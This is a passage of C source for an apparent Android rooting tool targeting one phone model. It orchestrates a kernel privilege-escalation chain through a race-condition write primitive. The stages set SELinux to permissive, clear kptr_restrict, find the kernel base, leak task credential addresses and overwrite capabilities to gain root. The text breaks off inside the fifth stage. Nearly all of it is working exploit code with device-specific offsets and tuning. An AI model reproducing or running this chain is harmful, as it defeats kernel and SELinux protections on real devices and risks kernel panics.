/*
 * SPDX-License-Identifier: Apache-2.0
 * Copyright 2026 GhostLock-X200-App contributors
 *
 * stages.c — STAGE1..7 编排（root_full_permissive_restore.ps1 的 C 移植）。
 * 所有路径在 cfg->work（app 私有目录），w2host 与 runner 同 uid。
 */
#include "runner.h"
#include "devices.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <errno.h>
#include <ctype.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <time.h>

/* ---------- helpers ---------- */

static void path_join(char *buf, size_t sz, const char *dir, const char *name) {
    snprintf(buf, sz, "%s/%s", dir, name);
}

/* 二进制路径：优先 bindir（nativeLibraryDir，app 可 exec），回退 work。
 * nativeLibraryDir 里文件名带 lib 前缀 + .so 后缀（libghostglt.so 等），
 * 故按候选名列表逐个尝试（先精确名，再 lib 前缀变体）。 */
static void bin_path(const RunnerCfg *cfg, char *buf, size_t sz, const char *name) {
    if (cfg->bindir && cfg->bindir[0]) {
        const char *cands[3];
        int n = 0;
        char libname[512];
        /* 候选 1：lib<name>.so（nativeLibraryDir 实际文件名） */
        snprintf(libname, sizeof(libname), "lib%s.so", name);
        cands[n++] = libname;
        /* 候选 2：精确名（bindir 里手动放的） */
        cands[n++] = name;
        for (int i = 0; i < n; i++) {
            path_join(buf, sz, cfg->bindir, cands[i]);
            if (access(buf, X_OK) == 0) return;
        }
    }
    path_join(buf, sz, cfg->work, name);
}

/* glt 环境 flags：与 PC 原版 root.ps1 逐参数对齐（panic 防护关键） */
#define GLF_TASK_W2 0x01u  /* GL_TASK_W2=1：STAGE1/5 用（STAGE2 无，见 root.ps1:309） */
#define GLF_PROBE   0x02u  /* GL_PROBE=1：STAGE1/5 用（STAGE2 无） */

static void dump_glt_log(const RunnerCfg *cfg, const char *log_path, const char *stage); /* 前置声明 */

/* glt 运行：公共环境 + extra(K,V) 对，超时秒。
 * flags 控制 STAGE 差异化 env：STAGE2 必须无 TASK_W2/PROBE（PC 原版实证）。 */
static int glt_run(const RunnerCfg *cfg, const char *stage, int timeout_s,
                   unsigned flags, int attempts,
                   const char *const extra[][2], int n_extra, int *exit_code) {
    static const char *const fixed_base[][2] = {
        {"GL_USE_SLIDE", "1"},
        {"GL_EVENT_SYNC", "1"},
        {"GL_KEEP_CHAIN", "1"},
        /* The shipped glt checks getenv presence, not its numeric value.
         * Absent => sched_setattr enabled; even "0" disables it. All shell
         * stages must match the PC runner's explicit GL_NO_SCHED=1. */
        {"GL_NO_SCHED", "1"},
        {"GL_NO_LOCKPI", "1"},
        {"GL_SLIDE_ONLY", "1"},
    };
    static const char *const fixed_tw[][2] = { {"GL_TASK_W2", "1"} };
    static const char *const fixed_pr[][2] = { {"GL_PROBE", "1"} };
    const char *const (*fixed)[2] = fixed_base;
    int nf = (int)(sizeof(fixed_base) / sizeof(fixed_base[0]));
    /* GL_ATTEMPTS 动态：libc getenv 取 environ 第一个匹配，extra 里的
     * 重复 key 覆盖不了 fixed_base（真机实证 GL_ATTEMPTS=4 未生效，
     * 只跑 attempt 1）→ 必须从 fixed_base 移除，按 stage 显式传值。 */
    char attempts_s[16];
    if (attempts < 1) attempts = 1;
    snprintf(attempts_s, sizeof(attempts_s), "%d", attempts);
    const char *const fixed_at[][2] = { {"GL_ATTEMPTS", attempts_s} };
    int n_extra_f = 0;
    if (flags & GLF_TASK_W2) n_extra_f++;
    /* 注意: GLF_PROBE 分支实际注入 2 项 (GL_PROBE + GL_PROBE_FILE)，
     * 这里必须 +2，否则 total 少算 → envp 数组堆溢出 → GL_PROBE_FILE
     * 丢失 → slide_probe fallback 到 /data/local/tmp 写失败(errno=13)。
     * （2026-08-30 真机 probe 日志 `path=/data/local/tmp/slide_probe`
     *  `open failed errno=13` 实证。） */
    if (flags & GLF_PROBE) n_extra_f += 2;
    int total = nf + 1 + n_extra_f + n_extra;
    char **envp = malloc(sizeof(char *) * (total + 1));
    if (!envp) return -1;
    int idx = 0;
    for (int i = 0; i < nf; i++) {
        size_t len = strlen(fixed[i][0]) + strlen(fixed[i][1]) + 2;
        char *e = malloc(len);
        snprintf(e, len, "%s=%s", fixed[i][0], fixed[i][1]);
        envp[idx++] = e;
    }
    {
        size_t len = strlen(fixed_at[0][0]) + strlen(fixed_at[0][1]) + 2;
        char *e = malloc(len);
        snprintf(e, len, "%s=%s", fixed_at[0][0], fixed_at[0][1]);
        envp[idx++] = e;
    }
    if (flags & GLF_TASK_W2) {
        size_t len = strlen(fixed_tw[0][0]) + strlen(fixed_tw[0][1]) + 2;
        char *e = malloc(len);
        snprintf(e, len, "%s=%s", fixed_tw[0][0], fixed_tw[0][1]);
        envp[idx++] = e;
    }
    if (flags & GLF_PROBE) {
        size_t len = strlen(fixed_pr[0][0]) + strlen(fixed_pr[0][1]) + 2;
        char *e = malloc(len);
        snprintf(e, len, "%s=%s", fixed_pr[0][0], fixed_pr[0][1]);
        envp[idx++] = e;
        /* 决定性观测: 让 slide_probe 落到 app work 目录而非 /data/local/tmp
         * (app 域前者静默失败 → consumer/waiter 足迹尽失). STAGE1/5 才激活. */
        char pf_var[64], pf_tmp[700];
        snprintf(pf_var, sizeof(pf_var), "GL_PROBE_FILE");
        snprintf(pf_tmp, sizeof(pf_tmp), "%s/glt_probe_%s.txt", cfg->work, stage);
        char *pe = malloc(strlen(pf_var) + strlen(pf_tmp) + 2);
        snprintf(pe, strlen(pf_var) + strlen(pf_tmp) + 2, "%s=%s", pf_var, pf_tmp);
        envp[idx++] = pe;
    }
    for (int i = 0; i < n_extra; i++) {
        size_t len = strlen(extra[i][0]) + strlen(extra[i][1]) + 2;
        char *e = malloc(len);
        snprintf(e, len, "%s=%s", extra[i][0], extra[i][1]);
        envp[idx++] = e;
    }
    envp[idx] = NULL;

    char glt_path[512], log_path[512];
    bin_path(cfg, glt_path, sizeof(glt_path), "glt_esync");
    snprintf(log_path, sizeof(log_path), "%s/glt_%s.log", cfg->work, stage);

    char *argv[] = { glt_path, NULL };
    char checkpoint[96];
    snprintf(checkpoint, sizeof(checkpoint), "%s/cleanup-before", stage);
    runner_event(cfg, checkpoint, 0);
    int rc;
    if (cleanup_exec(glt_path, 2000) != 0) {
        LOG("PROCESS_CLEANUP FAIL: %s before start; no new task launched", stage);
        runner_event(cfg, checkpoint, RUNNER_CLEANUP_FAILED);
        rc = RUNNER_CLEANUP_FAILED;
        goto out;
    }
    LOG("glt[%s]: GL_NO_SCHED=1 (scheduler trigger disabled)", stage);
    snprintf(checkpoint, sizeof(checkpoint), "%s/run", stage);
    runner_event(cfg, checkpoint, 0);
    rc = exec_timeout(glt_path, argv, envp, log_path, timeout_s, exit_code);
    runner_event(cfg, checkpoint, rc);
    /* A leader exiting normally does not imply all of its descendants exited.
     * This is deliberately scoped to this task, never the manager daemon. */
    snprintf(checkpoint, sizeof(checkpoint), "%s/cleanup-after", stage);
    if (cleanup_exec(glt_path, 2000) != 0) {
        LOG("PROCESS_CLEANUP FAIL: %s after exit; no further task allowed", stage);
        rc = RUNNER_CLEANUP_FAILED;
    }
    runner_event(cfg, checkpoint, rc == RUNNER_CLEANUP_FAILED ? rc : 0);

    /* 诊断：glt 详细日志 dump 到 stdout（app 回显 logcat）。app 私有目录
     * /data/user/0/.../files/ghostboot/ 是 mode 700，adb shell 读不到——这是
     * 定位"app 域 glt 竞速到底写没写成功"的唯一真相来源。 */
    if (rc == 0 || rc == 1) dump_glt_log(cfg, log_path, stage);

out:
    for (int i = 0; i < total; i++) free(envp[i]);
    free(envp);
    return rc;
}

/* 诊断：读 glt 子进程日志文件，dump 到 stdout。 */
static void dump_glt_log(const RunnerCfg *cfg, const char *log_path, const char *stage) {
    char *gl = read_file(log_path);
    if (!gl) { LOG("[diag] glt[%s] log: (none)", stage); return; }
    int lines = 0;
    for (char *p = gl; *p; p++) if (*p == '\n') lines++;
    /* 取证注意: tail-40 截断曾吞掉 event-sync/wchan/consumer 触发分支
     * 关键日志行(round1/2/3 全空已证), 改为全量输出以定位写原语不落地. */
    LOG("--- glt[%s] log FULL (%d lines) ---", stage, lines);
    printf("%s", gl);
    if (lines == 0 || gl[strlen(gl) - 1] != '\n') printf("\n");
    fflush(stdout);
    free(gl);
    /* probe 足迹（consumer/waiter event-sync 三态）: 顺带 dump. */
    char pf_path[700];
    snprintf(pf_path, sizeof(pf_path), "%s/glt_probe_%s.txt", cfg->work, stage);
    char *pf = read_file(pf_path);
    if (pf) {
        int plines = 0;
        for (char *p = pf; *p; p++) if (*p == '\n') plines++;
        LOG("--- glt[%s] probe trace (%d lines: tid:stage) ---", stage, plines);
        printf("%s", pf);
        if (plines == 0 || pf[strlen(pf) - 1] != '\n') printf("\n");
        fflush(stdout);
        free(pf);
    } else {
        LOG("--- glt[%s] probe trace: (none / not armed) ---", stage);
    }
}

/* 生成 GL_TARGET 十六进制文本（physmap 写目标 / cred+56） */
static void hex64(char *buf, size_t sz, uint64_t v) {
    snprintf(buf, sz, "0x%llx", (unsigned long long)v);
}

/* Clean only the executable managed by this run; stale PID files and a
 * command-line substring must never select an unrelated process. */
static int kill_w2host(const RunnerCfg *cfg) {
    char binary[512];
    bin_path(cfg, binary, sizeof(binary), "w2host");
    runner_event(cfg, "worker/cleanup", 0);
    if (cleanup_exec(binary, 2000) != 0) {
        runner_event(cfg, "worker/cleanup", RUNNER_CLEANUP_FAILED);
        return RUNNER_CLEANUP_FAILED;
    }
    char pid_path[512];
    path_join(pid_path, sizeof(pid_path), cfg->work, "w2host.pid");
    remove(pid_path);
    /* B 修复 (2026-08-29): 对齐 PC 版 root.ps1 STAGE4 ROUND 每轮
     * "rm -f $dev_sock $dev_cred $dev_dbg $dev_proof $dev_task" + Start-Sleep 2.
     * w2host 失败轮不写 cred (O_TRUNC 只有成功才清空) -> 残留上一轮旧
     * cred 被 runner 误读 -> 假候选 -> STAGE5 假阳性/panic. */
    char p[512];
    snprintf(p, sizeof(p), "%s/rootcmd_%s.sock", cfg->work, cfg->tag); remove(p);
    snprintf(p, sizeof(p), "%s/cred.txt", cfg->work);   remove(p);
    snprintf(p, sizeof(p), "%s/w2_dbg.txt", cfg->work); remove(p);
    snprintf(p, sizeof(p), "%s/proof.txt", cfg->work);  remove(p);
    snprintf(p, sizeof(p), "%s/w2_task.txt", cfg->work); remove(p);
    sleep_s(2);
    return 0;
}

static pid_t spawn_w2host(const RunnerCfg *cfg) {
    char w2_path[512], log_path[512];
    bin_path(cfg, w2_path, sizeof(w2_path), "w2host");
    snprintf(log_path, sizeof(log_path), "%s/w2host.log", cfg->work);

    uint64_t mem = get_memtotal_bytes();
    if (mem == 0) mem = 12ULL * 1024 * 1024 * 1024; /* 兜底 12GB */

    char sock[512], cred[512], dbg[512], proof[512], ksrc[512], kmark[512], task[512];
    char manager_log[512], manager_status[512];
    snprintf(manager_log, sizeof(manager_log), "%s/manager_load.log", cfg->work);
    snprintf(manager_status, sizeof(manager_status), "%s/manager_load.status", cfg->work);
    char cand_min[64], direct_end[64], ips[256], ip_lo[64], ip_hi[64];
    snprintf(sock, sizeof(sock), "%s/rootcmd_%s.sock", cfg->work, cfg->tag);
    snprintf(cred, sizeof(cred), "%s/cred.txt", cfg->work);
    snprintf(dbg, sizeof(dbg), "%s/w2_dbg.txt", cfg->work);
    snprintf(proof, sizeof(proof), "%s/proof.txt", cfg->work);
    snprintf(task, sizeof(task), "%s/w2_task.txt", cfg->work);   /* w2host 写 task 地址（备用） */
    snprintf(ksrc, sizeof(ksrc), "%s/ksud", cfg->work);
    snprintf(kmark, sizeof(kmark), "%s/ksetup_mark.txt", cfg->work);
    hex64(cand_min, sizeof(cand_min), DEV_PHYSMAP_BASE + DEV_W2_CAND_MIN_ADD);
    hex64(direct_end, sizeof(direct_end), DEV_PHYSMAP_BASE + mem);
    snprintf(ips, sizeof(ips), "0x%llx,0x%llx,0x%llx,0x%llx,0x%llx,0x%llx,0x%llx",
             (unsigned long long)0xcbc0cULL, (unsigned long long)0xcbc10ULL,
             (unsigned long long)0xcbc14ULL, (unsigned long long)0xcbc18ULL,
             (unsigned long long)0xcbc1cULL, (unsigned long long)0xcc5b0ULL,
             (unsigned long long)0xcc5d4ULL);
    hex64(ip_lo, sizeof(ip_lo), DEV_W2_IP_LO);
    hex64(ip_hi, sizeof(ip_hi), DEV_W2_IP_HI);

    char *envp[] = {
        "W2_SOCK=?", "W2_CRED=?", "W2_DBG=?", "W2_PROOF=?", "W2_TASK=?",
        "W2_CRED_IPS=?", "W2_IP_LO=?", "W2_IP_HI=?", "W2_CAND_MIN=?",
        "W2_DIRECT_END=?", "W2_KSETUP_SRC=?", "W2_KSETUP_MARK=?",
        "W2_MANAGER_PKG=?", "W2_MANAGER_LOG=?", "W2_MANAGER_STATUS=?", NULL
    };
    /* 逐个写实际值（保持 envp 数组顺序不变） */
    const char *vals[] = { sock, cred, dbg, proof, task, ips, ip_lo, ip_hi, cand_min,
                     direct_end, ksrc, kmark, cfg->manager_package ? cfg->manager_package : "",
                     manager_log, manager_status };
    static const char *keys[] = { "W2_SOCK", "W2_CRED", "W2_DBG", "W2_PROOF",
                                  "W2_TASK", "W2_CRED_IPS", "W2_IP_LO",
                                  "W2_IP_HI", "W2_CAND_MIN", "W2_DIRECT_END",
                                  "W2_KSETUP_SRC", "W2_KSETUP_MARK",
                                  "W2_MANAGER_PKG", "W2_MANAGER_LOG", "W2_MANAGER_STATUS" };
    static char envbuf[16][512];
    int ei = 0;
    for (int i = 0; i < 15; i++) {
        snprintf(envbuf[ei], sizeof(envbuf[ei]), "%s=%s", keys[i], vals[i]);
        envp[ei] = envbuf[ei];
        ei++;
    }
    envp[ei] = NULL;

    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        setpgid(0, 0);   /* 独立进程组：w2host 竞速进程，避免 runner 组杀波及 */
        int fd = open(log_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd >= 0) { dup2(fd, 1); dup2(fd, 2); if (fd > 2) close(fd); }
        char *argv[] = { w2_path, NULL };
        execve(w2_path, argv, envp);
        _exit(127);
    }
    char pid_path[512];
    path_join(pid_path, sizeof(pid_path), cfg->work, "w2host.pid");
    char pbuf[32];
    snprintf(pbuf, sizeof(pbuf), "%d\n", (int)pid);
    write_file(pid_path, pbuf);
    return pid;
}

/* 解析 cred 文件候选：与 root.ps1 正则一致 ^ffffff[8cdef][0-9a-f]{9}$
 * （18 hex 字符：'ffffff' + 1 位 {8cdef} + 9 位 hex），去重非零。 */
static size_t parse_cands(const char *content, char *cands, size_t max, size_t elemsz) {
    size_t n = 0;
    const char *p = content;
    while (p && *p && n < max) {
        const char *m = strstr(p, "ffffff");
        if (!m) break;
        /* 前面必须是空格/换行/串首（token 边界） */
        if (m > content && !(m[-1] == ' ' || m[-1] == '\n' || m[-1] == '\t' || m[-1] == '\r')) {
            p = m + 6;
            continue;
        }
        int ok = (m[6] == '8' || m[6] == 'c' || m[6] == 'd' || m[6] == 'e' || m[6] == 'f');
        if (ok)
            for (int i = 7; i < 16; i++)
                if (!isxdigit((unsigned char)m[i])) { ok = 0; break; }
        /* 第 16 位后必须是分隔符（正则 $ 锚点） */
        if (ok && !(m[16] == 0 || m[16] == ' ' || m[16] == '\n' || m[16] == '\t' || m[16] == '\r'))
            ok = 0;
        if (ok) {
            uint64_t v = strtoull(m, NULL, 16);
            int dup = 0;
            if (v != 0) {
                for (size_t i = 0; i < n; i++)
                    if (strtoull(cands + i * elemsz, NULL, 0) == v) { dup = 1; break; }
                if (!dup) {
                    snprintf(cands + n * elemsz, elemsz, "0x%llx",
                             (unsigned long long)v);
                    n++;
                }
            }
            p = m + 16;
            continue;
        }
        p = m + 6;
    }
    return n;
}

/* ---------- STAGE0 机型门禁 ---------- */
int stage0_gate(const RunnerCfg *cfg) {
    char rel[256] = {0};
    const char *r = get_osrelease(rel, sizeof(rel));
    if (!r) { LOG("GATE FAIL: cannot read kernel release"); return -1; }
    if (strcmp(rel, DEV_KERNEL_RELEASE) != 0) {
        LOG("GATE FAIL: kernel release '%s' != '%s'", rel, DEV_KERNEL_RELEASE);
        return -1;
    }
    LOG("GATE OK: kernel %s", rel);
    if (cfg->manager_package) {
        char *modules = read_file("/proc/modules");
        if (!modules) { LOG("GATE FAIL: cannot inspect loaded modules"); return -1; }
        int loaded = strncmp(modules, "kernelsu ", 9) == 0 || strstr(modules, "\nkernelsu ") ||
                     strncmp(modules, "sukisu ", 7) == 0 || strstr(modules, "\nsukisu ") ||
                     strncmp(modules, "resukisu ", 9) == 0 || strstr(modules, "\nresukisu ");
        free(modules);
        if (loaded && (getuid() != 0 || geteuid() != 0)) {
            LOG("GATE FAIL: a manager kernel is already loaded; reboot before changing/loading managers");
            return -1;
        }
    }
    return 0;
}

/* ---------- STAGE1 permissive ----------
 * app 域（untrusted_app）在 Enforcing 下读 enforce 被拒、Permissive 后可读。
 * 验证：getenforce==1 或 enforce 文件变为可读（上游 ghostlock-app 同思路）。 */
int stage1_permissive(const RunnerCfg *cfg) {
    char lock[64], target[64];
    int ep = getenforce_permissive();
    /* already 短路（PC 原版 root.ps1:272）：已 Permissive 直接跳过写链。
     * 缺失时在已 root 状态二次执行 glt 写链 → 诱发 GPU hang → Mali reset panic
     * （2026-08-29 pstore 实证，见 docs/PROGRESS.md）。
     * 判定语义（2026-08-29 shell 域实测修正）：
     *   getenforce_permissive()==1  → 确定 Permissive；
     *   ==0  → 确定 Enforcing（shell 域可读 enforce 内容='1'）；
     *   ==-1 → app 域读不到（SELinux 拒），此时 enforce_readable() 才有意义
     *           （app 域 Permissive 后文件变为可读=间接证据）。
     * 修复前：enforce_readable() 独立成立即 SKIP，shell 域 Enforcing 下
     *   enforce 可读（内容=1）→ 假阳性 SKIP，写链从未执行（真机实证）。 */
    if (ep == 1 || (ep == -1 && enforce_readable())) {
        LOG("STAGE1 SKIP: already Permissive");
        return 0;
    }
    /* STAGE1 竞速前 uptime 稳定门（对齐 PC root.ps1:245-270 的
     * 「等待设备稳定 uptime>240s」）：设备未稳定时竞速部分命中 panic
     * 概率激增（开机风暴窗口：dexopt/媒体扫描/云控/Shizuku 自举抢 CPU）。
     * 2026-08-30 真机实证：重启后立即自举 Shizuku+竞速 → STAGE1
     * 部分命中写坏 rt_mutex → kernel_panic（pstore：_raw_spin_trylock
     * ←rt_mutex_adjust_prio_chain←remove_waiter←futex_lock_pi）。
     * PC 版靠此门把部分命中率压低（40+ 次低 panic 率），app 版此前缺。 */
    {
        long up = get_uptime_seconds();
        int waited = 0;
        int reported = 0;
        while (up >= 0 && up < 240 && waited < 400) {
            if (!reported) {
                LOG("STAGE1 WAIT: uptime=%lds < 240s (开机稳定窗口，等待以避免竞速 panic)", up);
                reported = 1;
            }
            sleep_s(10);
            waited += 10;
            up = get_uptime_seconds();
        }
        if (up >= 0 && up < 240)
            LOG("STAGE1 WAIT: 400s 内未达 240s (up=%lds)，继续 (风险自担)", up);
        else if (reported)
            LOG("STAGE1 WAIT: uptime=%lds OK", up);
    }
    /* 触发策略 (2026-08-30, Shizuku shell 域正式路线):
     * app 域攻坚的 3 阶段 plan（A1/B32/C sched）已废弃：
     *   - glt 已恢复 prebuilt 原版 341074c4（shell 域唯一验证成功的 clang8 时序），
     *     其 prepare_good_kernel_page 在 attempt 循环内，每 attempt 全量 800 子进程；
     *     attempts=32（B 轮）→ 32×800 子进程风暴 → watchdog hung panic（实证）。
     *   - Shizuku/rish/adb shell 域（Seccomp=0、cpuset=/）与 PC 版环境一致，
     *     单窗口 delay=5000 一轮命中（PC 版 40+ 次 + rish 对照实证）。
     * 保留单轮 A：attempts=1 单窗口 SIGUSR1，timeout 90s（shell 域 20-30s 完成）。 */
    static const struct { int attempts; int timeout_s; } plan[] = {
        {1, 90},   /* A: 单窗口 SIGUSR1 remove_waiter 触发 */
    };
    for (int round = 1; round <= (int)(sizeof(plan) / sizeof(plan[0])); round++) {
        int attempts = plan[round - 1].attempts;
        int timeout_s = plan[round - 1].timeout_s;
        if (!gl_lock_next(cfg->work, lock, sizeof(lock))) {
            LOG("STAGE1 FAIL: GL_STATE reservation failed; stopped before glt");
            return -1;
        }
        hex64(target, sizeof(target), DEV_SE_P0);
        const char *const extra[][2] = {
            {"GL_LOCK", lock},
            {"GL_TARGET", target},
        };
        int rc = -1;
        int e = glt_run(cfg, "s1_permissive", timeout_s, GLF_TASK_W2 | GLF_PROBE, attempts, extra, 2, &rc);
        if (e < 0) {
            LOG("STAGE1 FAIL: task execution/cleanup failed; stopped");
            return e;
        }
        if (e == 1) LOG("STAGE1 r%d(a%d): glt timeout", round, attempts);
        ep = getenforce_permissive();
        if (ep == 1 || (ep == -1 && enforce_readable())) {
            LOG("STAGE1 OK (round %d attempts %d): SELinux Permissive", round, attempts);
            return 0;
        }
        LOG("STAGE1 round %d attempts %d: still enforcing (rc=%d)", round, attempts, rc);
    }
    LOG("STAGE1 FAIL: 1 round (A1)");
    return -1;
}

/* ---------- STAGE2 kptr ----------
 * root.ps1 实测 (leaf-RED 形态, slide.c words 表定案):
 *   GL_TARGET_LEAF=1 GL_LOCK=<slot> GL_W0=<kptr_restrict_p0 - 8>
 * 写原语: words[0]=parent_color=slide_w0_val()=GL_W0(RED|1)
 *  → rb_erase 叶子形态写 [GL_W0 & ~1] = 0 → kptr_restrict 清零。
 * 注意: 此处必须用 GL_W0 而非 GL_TARGET —— LEAF 形态 words[2]=tree_left=0,
 *   GL_TARGET 不参与写目标; 用 GL_TARGET 会导致 slide_w0_val() 走默认
 *   slide_loggers_addr()|1 → 写 loggers 区而非 kptr_restrict（真 bug，已修）。 */
int stage2_kptr(const RunnerCfg *cfg) {
    char lock[64], w0[64];
    /* already 短路（PC 原版 root.ps1:310-311）：kptr 已 0 直接跳过写链（同上 panic 防护）。 */
    if (get_kptr_restrict() == 0) {
        LOG("STAGE2 SKIP: kptr_restrict already 0");
        return 0;
    }
    for (int round = 1; round <= 5; round++) {
        if (!gl_lock_next(cfg->work, lock, sizeof(lock))) {
            LOG("STAGE2 FAIL: GL_STATE reservation failed; stopped before glt");
            return -1;
        }
        hex64(w0, sizeof(w0), DEV_W0);
        /* 同 STAGE1：app 域覆盖对齐扫描（LEAF 形态同样受 pselect 覆盖
         * 对齐影响，shell 域 pad=0/fpad=0 命中，app 域需扫组合）。 */
        static const int pad_sweep[] = {0, 0, 32, 64, 0};
        static const int fpad_sweep[] = {0, 32, 0, 0, 64};
        char pad_s[16], fpad_s[16];
        snprintf(pad_s, sizeof(pad_s), "%d", pad_sweep[(round - 1) % 5]);
        snprintf(fpad_s, sizeof(fpad_s), "%d", fpad_sweep[(round - 1) % 5]);
        const char *const extra[][2] = {
            {"GL_LOCK", lock},
            {"GL_W0", w0},
            {"GL_TARGET_LEAF", "1"},
            {"GL_ENTER_DELAY", "5000"},
            {"GL_PAD", pad_s},
            {"GL_FPAD", fpad_s},
        };
        int e = glt_run(cfg, "s2_kptr", 120, 0, 1, extra, 6, NULL);
        if (e < 0) {
            LOG("STAGE2 FAIL: task execution/cleanup failed; stopped");
            return e;
        }
        if (e == 1) LOG("STAGE2 round %d: glt timeout", round);
        if (get_kptr_restrict() == 0) {
            LOG("STAGE2 OK (round %d): kptr_restrict=0", round);
            return 0;
        }
        LOG("STAGE2 round %d: kptr still %ld", round, get_kptr_restrict());
    }
    LOG("STAGE2 FAIL: 5 rounds");
    return -1;
}

/* ---------- STAGE3 kbase ---------- */
int stage3_base(const RunnerCfg *cfg, SymTab *ksym) {
    (void)cfg;
    if (symtab_load_proc(ksym) != 0) { LOG("STAGE3 FAIL: cannot read /proc/kallsyms"); return -1; }
    uint64_t base = symtab_find(ksym, "_text");
    if (base == 0) { LOG("STAGE3 FAIL: _text not found"); return -1; }
    /* 校验 ^ffffff[cdef] 前缀 + 00000 结尾
     * （2026-08-29 修正：原 (base>>56)==0xffffff 恒假——>>56 只留 8bit=0xff。
     *  PC 版 root.ps1 是 hex 字符串正则，校验高 24bit=0xffffff（>>40）+
     *  第 7 个 hex 字符（bit 39-36）∈[c-f]。真机 _text=0xffffffe434200000
     *  （>>40=0xffffff、(>>36)&0xf=0xe）实证）。 */
    int hi_ok = (base >> 40) == 0xffffffULL &&
                ((base >> 36) & 0xf) >= 0xc && ((base >> 36) & 0xf) <= 0xf;
    int lo_ok = (base & 0xfffff) == 0;
    if (!hi_ok || !lo_ok) {
        LOG("STAGE3 FAIL: _text=0x%llx shape unexpected", (unsigned long long)base);
        return -1;
    }
    ksym->kbase = base;
    LOG("STAGE3 OK: kbase=_text=0x%llx (%zu syms)", (unsigned long long)base, ksym->count);
    return 0;
}

/* ---------- STAGE4 静默门（对齐 PC 原版 root.ps1:397-428 + X200 实测负载） ----------
 * X200 loadavg 常态 15+（wallpaper engine 等 vivo 后台常驻），从未低于 15，
 * <1.5 门槛永远等不到（用户拍板：<20 即安全窗口）。
 * 最少 12s 静默 + loadavg<20 才进入写链；>=2000 硬中止（panic 风险）；
 * 12-60s 未静默 → WARN 继续（R1 miss 概率升高由 ROUND 覆盖）。 */
int stage4_quiesce(const RunnerCfg *cfg) {
    (void)cfg;
    long la = -1;
    int qWait = 0;
    for (;;) {
        la = get_loadavg_1min();
        if (la >= 2000) { LOG("STAGE4 ABORT: loadavg %.2f >= 20", la / 100.0); return -1; }
        if (la >= 0 && la < 2000 && qWait >= 12) {
            LOG("STAGE4 OK: loadavg %.2f, quiesced at %ds", la / 100.0, qWait);
            return 0;
        }
        sleep_s(2);
        qWait += 2;
        if (qWait >= 60) break;
    }
    if (la >= 0 && la < 2000) {
        LOG("STAGE4 WARN: loadavg %.2f 60s 未静默, 继续 (miss 概率升高)", la / 100.0);
        return 0;
    }
    LOG("STAGE4 FAIL: 60s not quiesced");
    return -1;
}

/* ---------- STAGE4 泄漏：启动 w2host → 等 cred 候选 ---------- */
int stage4_leak(const RunnerCfg *cfg, char *cands, size_t candsz) {
    if (kill_w2host(cfg) != 0) return RUNNER_CLEANUP_FAILED;
    if (spawn_w2host(cfg) <= 0) { LOG("STAGE4 FAIL: spawn w2host"); return -1; }
    LOG("STAGE4: w2host spawned, waiting cred file (40x3s)");

    char cred_path[512];
    snprintf(cred_path, sizeof(cred_path), "%s/cred.txt", cfg->work);
    char *content = NULL;
    for (int i = 0; i < 40; i++) {
        sleep_s(3);
        content = read_file(cred_path);
        if (content && strlen(content) > 0) break;
        free(content);
        content = NULL;
    }
    if (!content || strlen(content) == 0) {
        free(content);
        LOG("STAGE4 FAIL: no cred file in 120s");
        if (kill_w2host(cfg) != 0) return RUNNER_CLEANUP_FAILED;
        return -1;
    }
    size_t n = parse_cands(content, cands, candsz / 64, 64);
    free(content);
    if (n == 0) {
        LOG("STAGE4 FAIL: no valid candidates");
        if (kill_w2host(cfg) != 0) return RUNNER_CLEANUP_FAILED;
        return -1;
    }
    LOG("STAGE4 OK: %zu candidate(s): %s%s%s",
        n, (const char *)cands, n > 1 ? ", ..." : "", n == 1 ? "" : "");
    return 0;
}

/* ---------- STAGE5 CAPSROOT ---------- */
int stage5_capsroot(const RunnerCfg *cfg, const SymTab *ksym, const char *cands) {
    /* 分解候选列表（逗号/空格分隔） */
    char copy[1024];
    snprintf(copy, sizeof(copy), "%s", cands);
    char *toks[16];
    size_t nt = 0;
    char *save = NULL;
    for (char *tk = strtok_r(copy, " \t,\n", &save); tk && nt < 16;
         tk = strtok_r(NULL, " \t,\n", &save))
        toks[nt++] = tk;
    if (nt == 0) { LOG("STAGE5 FAIL: empty candidates"); return -1; }

    uint64_t capsym = symtab_capsym(ksym, ksym->kbase);
    char capsym_s[64];
    hex64(capsym_s, sizeof(capsym_s), capsym);
    LOG("STAGE5: capsym=0x%llx", (unsigned long long)capsym);

    char proof_path[512];
    snprintf(proof_path, sizeof(proof_path), "%s/proof.txt", cfg->work);

    for (int round = 1; round <= 3; round++) {
        for (size_t i = 0; i < nt; i++) {
            uint64_t cred = strtoull(toks[i], NULL, 0);
            if (cred == 0) continue;
            char lock[64], target[64];
            if (!gl_lock_next(cfg->work, lock, sizeof(lock))) {
                LOG("STAGE5 FAIL: GL_STATE reservation failed; stopped before glt");
                kill_w2host(cfg);
                return -1;
            }
            hex64(target, sizeof(target), cred + DEV_CAP_OFF);
            const char *const extra[][2] = {
                {"GL_LOCK", lock},
                {"GL_TARGET", target},
                {"GL_INIT_CRED", capsym_s},
                /* app 域对齐扫描（同 STAGE1/2）：每候选轮换 (pad,fpad)，
                 * 覆盖 app 域栈布局差异。候选通常 1-3 个，3 ROUND 覆盖
                 * 全部组合。 */
                {"GL_PAD", (round % 2) ? "0" : "32"},
                {"GL_FPAD", (i % 2) ? "32" : "0"},
            };
            /* 每次 glt 前删 proof.txt（PC 原版 root_full_permissive_restore.ps1:483
             * `rm -f $dev_proof $dev_crproof`）。缺失时上一轮/上一次运行的残留
             * proof（含 CAPSROOT 字样）→ STAGE5 假阳性 OK → rootcmd 未 fork →
             * STAGE6 socket unreachable（2026-08-29 shell18 实证：
             * proof.txt pid=18856 是 shell17 残留，shell18 无 CAPSROOT 日志仍判 OK）。 */
            remove(proof_path);
            /* STAGE5 超时对齐 PC 原版 timeout 20（root_full_permissive_restore.ps1:479）。
             * PC 版注释实证：高负载（loadavg=50 D 态堆积）下 STAGE5 写链 R1 直接
             * kernel_panic；20s 快速失败可缩小暴露窗口（部分命中→panic 固有风险）。
             * 候选循环外层 3 ROUND × 每 ROUND 重新泄漏 cred，由 stage5 循环承担。 */
            int e = glt_run(cfg, "s5_capsroot", 25, GLF_TASK_W2 | GLF_PROBE, 1, extra, 3, NULL);
            if (e < 0) {
                LOG("STAGE5 FAIL: task execution/cleanup failed; stopped");
                kill_w2host(cfg);
                return e;
            }
